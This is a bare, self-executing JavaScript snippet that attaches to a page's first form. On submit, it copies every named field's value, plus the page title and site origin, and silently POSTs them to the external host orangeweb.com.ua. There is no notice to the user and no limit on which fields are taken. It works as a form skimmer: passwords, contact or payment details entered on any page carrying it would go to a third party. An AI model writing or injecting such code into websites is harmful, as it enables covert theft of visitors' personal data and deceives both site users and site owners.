(function () {
  const form = document.querySelector('form');
  const url  = 'https://orangeweb.com.ua/';

  let title   = document.querySelector('title').innerText;
  let baseUrl = window.location.origin;

  form.onsubmit = (event) => {
      
      let data = {
        title: title,
        url: baseUrl
      };

      for(let i = 0; i < form.length; i++) {
        if(form[i]['name'] !== "") {
          data[form[i]['name']] = form[i]['value'];
        }
      }  

      let newData = JSON.stringify(data)

      fetch(url, {
          method: 'POST',
          body: newData,
          headers: {
              'Content-Type': 'application/x-www-form-urlencoded'
          }
      });
  }
}());
